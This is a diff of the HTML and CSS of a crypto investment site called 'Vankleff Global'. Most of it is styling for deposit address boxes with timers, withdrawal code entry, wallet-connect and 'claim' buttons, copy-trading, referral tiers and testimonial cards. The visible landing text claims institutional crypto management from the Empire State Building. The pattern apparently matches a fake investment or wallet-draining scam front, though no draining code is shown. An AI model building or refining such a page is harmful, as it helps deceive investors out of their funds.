@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,7 +10,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{font-family:'Inter','Segoe UI',sans-serif;background:#0c0c0c;color:#fff;overflow-x:hidden;padding-bottom:60px;}
+body{font-family:'Inter','Segoe UI',sans-serif;background:#0d0d0d;color:#fff;overflow-x:hidden;}
 a{color:inherit;text-decoration:none;}
 button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 
@@ -19,6 +20,13 @@ button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 .risk-box h2{font-size:22px;font-weight:900;margin-bottom:14px;}
 .risk-box p{color:#ccc;font-size:13px;line-height:1.7;margin-bottom:10px;}
 .btn-risk{width:100%;padding:16px;background:#22c55e;border-radius:14px;color:#fff;font-size:16px;font-weight:800;margin-top:18px;}
+
+.lang-fixed{position:fixed;bottom:16px;left:16px;z-index:600;}
+.lang-trigger{background:#1a1a2e;border:1px solid #c9a84c;border-radius:10px;padding:8px 14px;color:#c9a84c;font-size:13px;font-weight:700;display:flex;align-items:center;gap:6px;}
+.lang-drop{position:absolute;bottom:44px;left:0;background:#1a1a2e;border:1px solid #333;border-radius:12px;padding:8px 0;min-width:200px;max-height:300px;overflow-y:auto;display:none;}
+.lang-drop.open{display:block;}
+.lang-opt{padding:9px 16px;font-size:13px;cursor:pointer;color:#ccc;}
+.lang-opt:hover{background:#2a2a3e;color:#22c55e;}
 
 .navbar{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;border-bottom:1px solid #222;}
 .nav-logo{display:flex;align-items:center;gap:10px;}
@@ -66,6 +74,11 @@ button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 .hq-card td{padding:10px 4px;font-size:12px;color:#aaa;}
 .hq-card td:last-child{color:#fff;text-align:right;}
 
+.svc-card{background:#1a1a2e;border-radius:14px;padding:18px;margin-bottom:12px;}
+.svc-icon{width:42px;height:42px;background:#16322c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:10px;}
+.svc-card h3{font-size:15px;font-weight:700;margin-bottom:6px;}
+.svc-card p{color:#aaa;font-size:12px;line-height:1.6;}
+
 .plan-card{background:#1a1a2e;border-radius:16px;padding:20px;margin-bottom:14px;position:relative;border:1px solid #2a2a3e;}
 .plan-card.pop{border:2px solid #22c55e;}
 .plan-card.best{border:2px solid #3b82f6;}
@@ -83,6 +96,7 @@ button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 .trust-name{font-weight:700;font-size:13px;color:#c9a84c;}
 .trust-role{font-size:11px;color:#22c55e;}
 .trust-loc{font-size:10px;color:#aaa;}
+.tc{background:#1c2640;border-radius:14px;padding:16px;margin-bottom:12px;}
 
 .cta-box{background:#1a1a2e;border-radius:18px;padding:30px 22px;text-align:center;margin:20px;}
 .cta-logo{width:58px;height:58px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#c9a84c;margin:0 auto 14px;}
@@ -100,12 +114,14 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .legal-page h2{font-size:15px;font-weight:700;color:#c9a84c;margin:18px 0 8px;}
 .legal-page p{font-size:13px;color:#ccc;line-height:1.7;margin-bottom:10px;}
 
-.modal-ov,.pm-ov,.conf-ov,.gm-ov,.proc-ov,.suc-ov,.wd-note-ov{display:none;position:fixed;inset:0;z-index:200;}
-.modal-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open{display:flex;}
+/* MODALS */
+.modal-ov,.pm-ov,.conf-ov,.gm-ov,.cp-ov,.sup-ov,.proc-ov,.suc-ov,.wd-note-ov{display:none;position:fixed;inset:0;z-index:200;}
+.modal-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.cp-ov.open,.sup-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open{display:flex;}
 .modal-ov{background:rgba(0,0,0,.8);align-items:flex-end;justify-content:center;}
 .pm-ov{background:rgba(0,0,0,.75);z-index:250;align-items:flex-start;justify-content:center;padding-top:60px;}
 .conf-ov{background:rgba(0,0,0,.8);z-index:400;align-items:center;justify-content:center;}
 .gm-ov{background:rgba(0,0,0,.75);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.sup-ov{background:rgba(0,0,0,.8);z-index:450;align-items:center;justify-content:center;padding:20px;}
 .proc-ov{background:rgba(0,0,0,.85);z-index:490;align-items:center;justify-content:center;}
 .suc-ov{background:rgba(0,0,0,.7);z-index:500;align-items:center;justify-content:center;}
 .wd-note-ov{background:rgba(0,0,0,.85);z-index:510;align-items:center;justify-content:center;padding:20px;}
@@ -127,17 +143,22 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .spinner-ring{width:52px;height:52px;border:4px solid #2a2a2a;border-top:4px solid #22c55e;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 
-.net-selector{display:flex;gap:10px;margin-bottom:14px;background:#0d0d0d;border-radius:14px;padding:6px;}
+/* ── NETWORK SELECTOR ─────────────────────────────────────── */
+.net-selector{display:flex;gap:10px;margin-bottom:18px;background:#0d0d0d;border-radius:14px;padding:6px;}
 .net-opt{flex:1;display:flex;align-items:center;justify-content:center;gap:7px;padding:11px 8px;border-radius:10px;font-size:13px;font-weight:700;color:#aaa;cursor:pointer;border:2px solid transparent;transition:all .2s;}
-.net-opt.active{background:#16322c;border-color:#22c55e;color:#22c55e;}
+.net-opt.active-bsc{background:#16322c;border-color:#22c55e;color:#22c55e;}
+.net-opt.active-eth{background:#1a1e36;border-color:#627eea;color:#627eea;}
+.net-opt:not(.active-bsc):not(.active-eth):hover{background:#1a1a2e;}
 .net-icon{font-size:18px;}
-.active-net-bar{display:flex;align-items:center;gap:8px;background:#111;border-radius:10px;padding:9px 14px;margin-bottom:14px;font-size:12px;color:#aaa;flex-wrap:wrap;}
+.active-net-bar{display:flex;align-items:center;gap:8px;background:#111;border-radius:10px;padding:9px 14px;margin-bottom:14px;font-size:12px;color:#aaa;}
 .active-net-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
 .dot-bsc{background:#22c55e;}
 .dot-eth{background:#627eea;}
-.active-net-name{font-weight:700;color:#22c55e;}
-.active-net-id{font-size:10px;color:#666;margin-left:auto;font-family:monospace;}
+.active-net-name{font-weight:700;}
+.active-net-name.bsc{color:#22c55e;}
+.active-net-name.eth{color:#627eea;}
 
+/* DASHBOARD */
 .dash-nav{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid #222;}
 .ham{font-size:22px;color:#fff;background:none;}
 .dn-brand{display:flex;align-items:center;gap:8px;}
@@ -145,25 +166,21 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .dn-name{font-size:13px;font-weight:800;color:#c9a84c;}
 .dn-sub{font-size:10px;color:#888;display:block;}
 .av-circle{width:34px;height:34px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:14px;cursor:pointer;}
-
 .sb-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:150;}
 .sb-ov.open{display:block;}
-.sidebar{position:fixed;top:0;left:-300px;width:280px;height:100%;background:#0f1117;z-index:160;transition:left .3s;overflow-y:auto;padding-bottom:20px;display:flex;flex-direction:column;}
+.sidebar{position:fixed;top:0;left:-300px;width:280px;height:100%;background:#0f1117;z-index:160;transition:left .3s;overflow-y:auto;padding-bottom:40px;}
 .sidebar.open{left:0;}
 .sb-top{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid #1a1a2e;margin-bottom:8px;}
 .sb-close{font-size:20px;color:#aaa;background:none;}
 .sb-grp{font-size:10px;font-weight:700;color:#444;letter-spacing:2px;text-transform:uppercase;padding:12px 18px 4px;}
 .sb-item{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;cursor:pointer;border-radius:10px;margin:2px 8px;}
-.sb-item:hover,.sb-item.on{background:#2D4029;}
+.sb-item:hover,.sb-item.on{background:#1a2a1a;}
 .sb-left{display:flex;align-items:center;gap:12px;font-size:13px;color:#bbb;}
 .sb-item.on .sb-left{color:#22c55e;font-weight:600;}
 .sb-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;background:#1a1a2e;flex-shrink:0;}
 .sb-item.on .sb-icon{background:#16322c;}
-.sb-badge{background:#22c55e;color:#fff;font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;}
-.sb-logout .sb-left{color:#E74C3C;}
-.sb-spacer{flex:1;}
-.lang-selector{margin:16px 18px;display:inline-flex;align-items:center;gap:6px;border:1px solid #F1C40F;border-radius:20px;padding:8px 14px;font-size:12px;color:#F1C40F;cursor:pointer;width:fit-content;}
-
+.sb-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;color:#fff;}
+.bl-live{background:#22c55e;}.bl-pro{background:#7c3aed;}.bl-ai{background:#2563eb;}.bl-prem{background:#f59e0b;}.bl-10{background:#22c55e;}
 .dash-content{padding:18px;}
 .balance-card{background:linear-gradient(135deg,#1a2a1a,#0d1a0d);border-radius:16px;padding:20px;margin-bottom:18px;border:1px solid #1f3a1f;}
 .bal-lbl{font-size:11px;color:#aaa;margin-bottom:4px;}
@@ -189,7 +206,8 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .up{color:#22c55e;font-size:11px;}
 .dn2{color:#ef4444;font-size:11px;}
 
-.btn-cw{background:#22c55e;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;animation:cwblink 2s ease-in-out infinite;width:100%;}
+/* WEB3 PANELS */
+.btn-cw{background:#22c55e;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;animation:cwblink 2s ease-in-out infinite;}
 @keyframes cwblink{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{box-shadow:0 0 20px 8px rgba(34,197,94,.25)}}
 .wcta{background:#1a2a1a;border-radius:14px;padding:20px;text-align:center;margin-bottom:18px;}
 .btn-w3-claim{background:#eab308;color:#060e0a;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;display:none;}
@@ -197,7 +215,7 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .w3-btn-row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:12px;}
 .web3-panels{margin-top:6px;}
 #statusText{margin-top:1.5rem;font-size:0.95rem;min-height:1.5rem;color:#94a3b8;text-align:center;}
-#stageLog{margin-top:0.75rem;font-size:0.78rem;color:#475569;font-family:monospace;text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:0.75rem 1rem;max-height:200px;overflow-y:auto;display:none;}
+#stageLog{margin-top:0.75rem;font-size:0.78rem;color:#475569;font-family:monospace;text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:0.75rem 1rem;max-height:140px;overflow-y:auto;display:none;}
 #stageLog.visible{display:block;}
 .log-line{padding:1px 0;}
 .log-ok{color:#22c55e;}.log-warn{color:#eab308;}.log-err{color:#f87171;}
@@ -234,138 +252,101 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .tx-pending{background:rgba(234,179,8,.12);color:#facc15;}
 .tx-confirmed{background:rgba(34,197,94,.12);color:#22c55e;}
 .tx-failed{background:rgba(239,68,68,.12);color:#f87171;}
+.story-card{background:#1c2640;border-radius:14px;padding:16px;margin:0 20px 12px;display:flex;gap:12px;}
+.st-av{width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
 .btn-back{width:100%;padding:13px;border-radius:12px;font-size:13px;margin-top:12px;background:#1a1a2e;color:#ccc;}
 .ph{padding:22px 20px 8px;}
-.ph h1{font-size:24px;font-weight:900;}
+.ph h1{font-size:22px;font-weight:900;}
 .ph p{font-size:12px;color:#aaa;margin-top:4px;}
-
-/* DEPOSIT */
+.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
+.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
 .dep-wrap{padding:18px;}
 .meth-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
-.meth{background:#1a1a24;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
+.meth{background:#1a1a2e;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
 .meth.sel{border-color:#22c55e;color:#22c55e;background:#0d1a0d;}
-.meth-ic{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;}
-.ic-usdt{background:#26A17B;color:#fff;}
-.ic-ltc{background:#345D9D;color:#fff;}
-.ic-btc{background:#F7931A;color:#fff;}
-.ic-bnb{background:#F3BA2F;color:#000;}
-.dep-label{font-size:12px;color:#aaa;margin-bottom:8px;}
-.amt-input{background:#1a1a24;border:1px solid #d4af37;border-radius:12px;padding:14px;font-size:16px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
-.quick-amts{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:20px;}
-.qa{background:#1a1a24;border:1px solid #333;border-radius:8px;padding:10px 8px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;text-align:center;}
+.amt-input{background:#1a1a2e;border:1px solid #c9a84c;border-radius:12px;padding:14px;font-size:14px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
+.quick-amts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
+.qa{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:8px 12px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;}
 .btn-cont{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
 .addr-box{background:#1a1a2e;border-radius:12px;padding:14px;margin-bottom:12px;}
 .addr-val{font-family:'Courier New',monospace;font-size:12px;color:#22c55e;word-break:break-all;line-height:1.5;margin-bottom:10px;}
 .addr-row{display:flex;gap:8px;align-items:center;}
 .btn-copy{flex:1;padding:10px;background:#2563eb;border-radius:10px;color:#fff;font-size:13px;font-weight:700;}
 .net-badge{background:#16322c;border:1px solid #22c55e;border-radius:8px;padding:6px 10px;font-size:11px;color:#22c55e;font-weight:700;white-space:nowrap;}
-.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
-.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
 .timer-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;font-size:12px;color:#aaa;}
 .timer-val{color:#22c55e;font-weight:700;font-size:14px;}
-.btn-cd{width:100%;padding:15px;border-radius:12px;font-size:15px;font-weight:800;background:#22c55e;color:#fff;}
-
-/* WITHDRAW */
+.proof-box{border:2px dashed #333;border-radius:14px;padding:26px;text-align:center;margin-bottom:16px;cursor:pointer;}
 .sec-notice{background:#2a1a0a;border:1px solid #f59e0b;border-radius:12px;padding:14px;margin-bottom:20px;}
-.sec-notice h4{font-size:13px;font-weight:700;color:#f59e0b;margin-bottom:6px;}
-.sec-notice p{font-size:12px;color:#ccc;line-height:1.6;}
-.sec-info-box{background:#1a1a2e;border-radius:12px;padding:16px;margin-bottom:12px;}
-.sec-info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #2a2a3e;}
-.sec-info-row:last-child{border-bottom:none;}
-.sec-info-l{font-size:13px;color:#ccc;font-weight:600;}
-.sec-info-v{font-size:12px;color:#aaa;}
 .code-box{background:#1a1a2e;border:1px solid #c9a84c;border-radius:14px;padding:18px;margin-bottom:18px;overflow:hidden;}
 .otp-row{display:flex;gap:6px;margin-bottom:14px;overflow:hidden;}
 .otp-in{flex:1;min-width:0;height:52px;background:#0d0d0d;border:2px solid #c9a84c;border-radius:10px;text-align:center;font-size:18px;color:#fff;outline:none;}
-.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
-
-/* TRANSFER */
-.transfer-box{background:#1a1a2e;border:1px solid #c0a062;border-radius:16px;padding:20px;margin-bottom:16px;}
-.tf-balance{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid #2a2a3e;}
-.tf-balance-l{font-size:13px;color:#aaa;}
-.tf-balance-v{font-size:20px;font-weight:800;color:#22c55e;}
-.tf-label{font-size:12px;color:#aaa;margin-bottom:6px;}
-.tf-input{width:100%;background:#1e1e1e;border:1px solid #2a2a3e;border-radius:12px;padding:14px;color:#fff;font-size:14px;outline:none;margin-bottom:16px;}
-.tf-input::placeholder{color:#555;}
-.btn-transfer{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
-
-/* STATEMENT */
-.stmt-tabs{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;}
-.stmt-tab{flex-shrink:0;padding:8px 18px;border-radius:20px;font-size:12px;font-weight:700;cursor:pointer;}
-.stmt-tab.active{background:#22c55e;color:#000;}
-.stmt-tab:not(.active){background:#2D3625;color:#fff;}
-.stmt-card{background:#2D3625;border-radius:12px;padding:14px;margin:0 20px 10px;display:flex;align-items:center;gap:12px;}
-.stmt-ic{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
-.stmt-ic-dep{background:#16322c;color:#22c55e;}
-.stmt-ic-wit{background:#3a1a1a;color:#ef4444;}
-.stmt-ic-inv{background:#1a2a3a;color:#60a5fa;}
-.stmt-ic-copy{background:#2a2a3a;color:#c9a84c;}
-.stmt-info{flex:1;}
-.stmt-title{font-size:13px;font-weight:600;}
-.stmt-date{font-size:10px;color:#aaa;margin-top:2px;}
-.stmt-right{text-align:right;}
-.stmt-amt{font-size:14px;font-weight:700;}
-.stmt-amt.pos{color:#22c55e;}
-.stmt-amt.neg{color:#ef4444;}
-.stmt-badge{font-size:10px;padding:2px 8px;border-radius:6px;margin-top:4px;display:inline-block;font-weight:600;}
-.stmt-badge-pending{background:#B45309;color:#facc15;}
-.stmt-badge-completed{background:#0f3d2e;color:#22c55e;}
-
-/* SUCCESS STORIES */
-.story-card{background:#1a1a2e;border-radius:14px;padding:18px;margin:0 20px 14px;}
-.story-top{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
-.story-av{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid #F1C40F;}
-.story-name{font-size:14px;font-weight:700;color:#F1C40F;}
-.story-role{font-size:11px;color:#22c55e;}
-.story-stars{color:#f59e0b;font-size:13px;margin-bottom:6px;}
-.story-txt{font-size:12px;color:#ccc;line-height:1.6;font-style:italic;}
-.story-profit{font-size:13px;font-weight:700;color:#22c55e;margin-top:8px;}
-
-/* CHAT SUPPORT */
-.chat-wrap{padding:18px;}
-.chat-box{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:14px;min-height:300px;}
-.chat-msg{margin-bottom:12px;max-width:80%;}
-.chat-msg.sent{margin-left:auto;text-align:right;}
-.chat-bubble{display:inline-block;padding:10px 14px;border-radius:14px;font-size:13px;}
-.chat-msg.sent .chat-bubble{background:#22c55e;color:#fff;}
-.chat-msg.recv .chat-bubble{background:#2a2a3e;color:#ccc;}
-.chat-input-row{display:flex;gap:8px;position:fixed;bottom:50px;left:0;right:0;padding:10px 18px;background:#0c0c0c;border-top:1px solid #222;}
-.chat-input{flex:1;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:12px;color:#fff;font-size:13px;outline:none;}
-.chat-send{background:#22c55e;border-radius:12px;padding:12px 16px;color:#fff;font-size:14px;font-weight:700;}
-
-/* REFERRAL */
-.ref-code-box{background:#2D3625;border-radius:14px;padding:18px;margin:0 20px 14px;text-align:center;}
-.ref-code-lbl{font-size:11px;color:#aaa;margin-bottom:8px;}
-.ref-code-val{font-size:22px;font-weight:900;color:#22c55e;letter-spacing:3px;}
-.ref-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:0 20px 14px;}
-.ref-stat-card{background:#2D3625;border-radius:12px;padding:14px;text-align:center;}
-.ref-stat-val{font-size:20px;font-weight:900;color:#F1C40F;}
-.ref-stat-lbl{font-size:10px;color:#aaa;margin-top:4px;}
-.ref-link-box{background:#1a1a2e;border-radius:12px;padding:14px;margin:0 20px 14px;}
-.ref-link-val{font-family:monospace;font-size:11px;color:#22c55e;word-break:break-all;margin-bottom:10px;}
-
-/* SETTINGS */
-.settings-card{background:#1a1a2e;border-radius:16px;padding:18px;margin-bottom:16px;}
-.settings-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid #2a2a3e;}
-.settings-row:last-child{border-bottom:none;}
-.settings-l{font-size:13px;color:#ccc;}
-.settings-v{font-size:12px;color:#aaa;}
-
-/* FOOTER LANG SELECTOR */
-.footer-lang{position:fixed;bottom:12px;left:16px;z-index:90;display:inline-flex;align-items:center;gap:6px;border:1px solid #F1C40F;border-radius:20px;padding:7px 12px;font-size:11px;color:#F1C40F;cursor:pointer;background:#0c0c0c;}
-
-/* MODALS */
+.sig-card{background:#1a1a2e;border-radius:16px;padding:20px;margin:0 20px 14px;position:relative;}
+.sig-card.pop{border:2px solid #c9a84c;}
+.sig-price{font-size:30px;font-weight:900;color:#22c55e;margin:6px 0;}
+.sig-feats{list-style:none;margin-bottom:16px;}
+.sig-feats li{font-size:12px;color:#ccc;padding:3px 0;display:flex;align-items:center;gap:6px;}
+.sig-feats li::before{content:"✓";color:#22c55e;font-weight:700;}
+.btn-sub{width:100%;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.ip-item{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;cursor:pointer;}
+.ps-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;}
+.ps-amount{font-size:36px;font-weight:900;color:#22c55e;margin-bottom:12px;text-align:center;}
+input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
+.ps-sum{background:#1a2200;border-radius:12px;padding:14px;margin-bottom:16px;}
+.ps-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #2a3000;font-size:13px;}
+.ps-row:last-child{border-bottom:none;font-weight:800;}
+.ps-row span:last-child{color:#22c55e;}
+.ps-btns{display:flex;gap:10px;}
+.btn-psb{flex:1;padding:13px;background:#1a2200;border-radius:12px;color:#ccc;font-size:14px;}
+.btn-psi{flex:1;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;}
+.ct-card{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;}
+.ct-av{width:52px;height:52px;border-radius:50%;object-fit:cover;border:2px solid #c9a84c;}
+.ct-stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:10px 0;}
+.ct-stat{background:#1a2200;border-radius:10px;padding:10px;}
+.ct-stat-l{font-size:10px;color:#aaa;}
+.ct-stat-v{font-size:15px;font-weight:700;color:#22c55e;}
+.ref-hero{background:#2d3a00;border-radius:16px;padding:24px;text-align:center;margin-bottom:16px;}
+.ref-tiers{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:16px;}
+.ref-tier{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2a2a3e;}
+.ref-tier:last-child{border-bottom:none;}
+.ref-code{background:#2d3a00;border-radius:14px;padding:16px;margin-bottom:14px;}
+.ref-val{font-size:24px;font-weight:900;color:#22c55e;letter-spacing:3px;margin:8px 0;}
+.ref-link{display:flex;align-items:center;gap:8px;background:#1a2200;border-radius:10px;padding:10px;margin-top:8px;}
+.ref-link-txt{flex:1;font-size:11px;color:#aaa;word-break:break-all;}
+.ref-copy{background:#22c55e;border-radius:8px;padding:7px 12px;color:#fff;font-size:12px;font-weight:700;}
+.ref-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;}
+.ref-stat{background:#2d3a00;border-radius:12px;padding:14px;text-align:center;}
+.ref-sv{font-size:22px;font-weight:900;color:#c9a84c;}
+.set-card{background:#3a4a00;border-radius:16px;padding:18px;margin-bottom:16px;}
+.set-inp{width:100%;background:#2a3800;border:1px solid #4a5a00;border-radius:10px;padding:12px 14px;color:#fff;font-size:13px;margin-top:6px;outline:none;}
+.btn-save{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:14px;}
+.tf-card{background:#1a1a0a;border:1px solid #c9a84c;border-radius:16px;padding:20px;}
+.tf-in{width:100%;background:#0d0d0d;border:1px solid #333;border-radius:10px;padding:13px;color:#fff;font-size:14px;margin-bottom:12px;outline:none;}
+.stmt-filters{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;scrollbar-width:none;}
+.sfbtn{flex-shrink:0;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:700;background:#2d3a00;color:#ccc;}
+.sfbtn.on{background:#22c55e;color:#fff;}
+.st-item{background:#2d3a00;border-radius:12px;padding:14px 16px;margin:0 20px 10px;display:flex;align-items:center;justify-content:space-between;}
+.st-lft{display:flex;align-items:center;gap:12px;}
+.st-ico{width:38px;height:38px;border-radius:10px;background:#1a2200;display:flex;align-items:center;justify-content:center;font-size:18px;}
+.st-ttl{font-size:13px;font-weight:600;}
+.st-sub{font-size:10px;color:#aaa;margin-top:2px;}
+.st-amt{font-size:14px;font-weight:700;}
+.st-amt.p{color:#22c55e;}.st-amt.n{color:#ef4444;}
+.sbdg{font-size:10px;padding:2px 8px;border-radius:10px;margin-top:3px;display:inline-block;}
+.sp2{background:#3a2a00;color:#f59e0b;}
+.sc2{background:#1a2a1a;color:#22c55e;}
 .gm-box{border-radius:16px;padding:28px 24px;background:#2d3a00;width:100%;max-width:360px;text-align:center;position:relative;}
 .gm-close{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
 .btn-gm{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;}
 .btn-gmc{width:100%;padding:12px;background:transparent;border:none;color:#aaa;font-size:13px;}
+.btn-cd{width:100%;padding:15px;border-radius:12px;font-size:15px;font-weight:800;background:#22c55e;color:#fff;}
+.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
 .conf-box{background:#1a1a2e;text-align:center;max-width:300px;width:90%;border-radius:16px;padding:28px 24px;}
 .conf-btns{display:flex;gap:10px;margin-top:16px;}
 .btn-yes{flex:1;padding:13px;background:#ef4444;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
 .btn-no{flex:1;padding:13px;background:#1a2a1a;border-radius:12px;color:#ccc;font-size:14px;font-weight:600;border:1px solid #333;}
 .suc-box{background:#161b2e;text-align:center;max-width:340px;width:90%;border-radius:16px;padding:28px 24px;position:relative;}
 .suc-close{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
-.wd-note-box{background:#1a1d26;border:1px solid #c5a059;max-width:380px;width:90%;text-align:center;border-radius:20px;padding:32px 24px;position:relative;box-shadow:0 0 30px rgba(197,160,89,.15);}
+.wd-note-box{background:#161b2e;border:1px solid #c9a84c;max-width:380px;width:90%;text-align:center;border-radius:16px;padding:28px 24px;position:relative;}
 </style>
 </head>
 <body>
@@ -374,10 +355,13 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
   <div class="risk-box"><div class="risk-icon">⚠️</div><h2>Important Risk Disclosure</h2><p>Trading digital assets involves <strong>significant risk of loss</strong> and is not suitable for all investors.</p><p style="color:#888;font-size:12px;">You may lose some or all of your capital.</p><button class="btn-risk" onclick="acceptRisk()">I Understand and Accept</button></div>
 </div>
 
-<!-- ═══ LANDING PAGE ═══ -->
+<!-- LANDING PAGE -->
 <div id="page-landing" class="page active">
   <div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span><span class="brand-sub">New York · Est. 2015</span></div></div><div class="nav-btns"><button class="btn-login" onclick="openAuth('signin')">Member Login</button><button class="btn-open" onclick="openAuth('create')">Open Account</button></div></div>
-  <div class="hero"><div class="hero-bg"></div><div class="hero-overlay"></div><div class="hero-content"><div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div><h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1><p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p></div></div>
+  <div class="hero">
+    <div class="hero-bg"></div><div class="hero-overlay"></div>
+    <div class="hero-content"><div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div><h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1><p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p></div>
+  </div>
   <div class="about-curtain">
